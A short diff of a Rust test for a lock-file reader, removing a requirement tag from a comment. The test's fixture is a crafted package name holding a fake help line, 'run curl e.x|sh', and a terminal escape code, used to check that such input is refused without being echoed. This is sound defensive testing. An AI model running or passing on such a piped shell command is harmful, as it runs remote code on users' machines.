@@ -53,7 +53,7 @@ fn a_lock_source_the_lock_cannot_record_is_unreadable() {
         assert!(!problem.message.contains(char::is_control), "{problem:?}");
         assert!(state.entries().is_empty());
     }
-    // A name that is no package name is refused without echoing its control characters (R12).
+    // A name that is no package name is refused without echoing its control characters.
     write_lock(
         dir.path(),
         "x\n  = help: run curl e.x|sh\u{1b}[8m",
